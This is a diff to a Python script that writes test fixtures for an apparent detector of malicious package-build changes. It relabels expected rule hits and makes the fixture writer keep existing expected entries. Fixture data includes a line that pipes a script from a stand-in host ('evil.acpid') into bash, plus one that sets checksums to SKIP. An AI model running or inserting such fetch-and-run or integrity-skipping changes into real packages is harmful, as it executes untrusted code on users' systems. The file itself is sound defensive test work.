@@ -27,8 +27,9 @@ historical_fixtures = [
 +  curl -s https://evil.acpid/patch.sh | bash
 +}
 """,
-        "must_fire": ["R001", "R009"],
+        "must_fire": ["R001"],
         "must_not_fire": [],
+        "relabelled": "R009 dropped 2026-08-03: the diff contains no sudo; the label predated R009 becoming a command-position code rule",
     },
     {
         "name": "libjpeg-turbo-skid",
@@ -45,8 +46,9 @@ historical_fixtures = [
 -sha256sums=('abc123...')
 +sha256sums=('SKIP')
 """,
-        "must_fire": ["R004", "R026", "R014"],
+        "must_fire": ["R004", "R069"],
         "must_not_fire": [],
+        "relabelled": "R026 -> R004 (checksum set to SKIP), R014 -> R069 (validpgpkeys removed)",
     },
     {
         "name": "fake-browser-bin",
@@ -148,27 +150,41 @@ holdout_fixtures = [
 
 def write_fixtures(fixtures, directory, expected_file):
     directory.mkdir(parents=True, exist_ok=True)
+
+    # Record-preserving: existing entries (hand-reconciled labels, review
+    # notes) are the source of truth and are kept verbatim; only keys that
+    # are missing entirely are added from this script's fixtures.
     expected = {}
+    expected_path = directory / expected_file
+    if expected_path.exists():
+        expected = json.loads(expected_path.read_text())
+
+    preserved = 0
     for fx in fixtures:
         fname = fx["name"] + ".diff"
         (directory / fname).write_text(fx["diff"])
-        expected[fname] = {
+        if fname in expected:
+            preserved += 1
+            continue
+        entry = {
             k: v for k, v in fx.items()
             if k in ("description", "fidelity", "source")
         }
-    # Also include any synthetic-like expected keys (must_fire, etc.) if present
-    for fx in fixtures:
-        fname = fx["name"] + ".diff"
         if "must_fire" in fx:
-            expected[fname]["must_fire"] = fx["must_fire"]
+            entry["must_fire"] = fx["must_fire"]
         if "must_not_fire" in fx:
-            expected[fname]["must_not_fire"] = fx["must_not_fire"]
+            entry["must_not_fire"] = fx["must_not_fire"]
+        if "relabelled" in fx:
+            entry["relabelled"] = fx["relabelled"]
+        expected[fname] = entry
 
-    with open(directory / expected_file, "w") as f:
+    expected = {k: expected[k] for k in sorted(expected)}
+    with open(expected_path, "w") as f:
         json.dump(expected, f, indent=2, ensure_ascii=False)
         f.write("\n")
 
-    print(f"Wrote {len(fixtures)} fixtures to {directory}")
+    print(f"Wrote {len(fixtures)} fixtures to {directory} "
+          f"({preserved} existing entries preserved)")
     for fx in fixtures:
         print(f"  {fx['name']}: {fx.get('description', '')}")
 
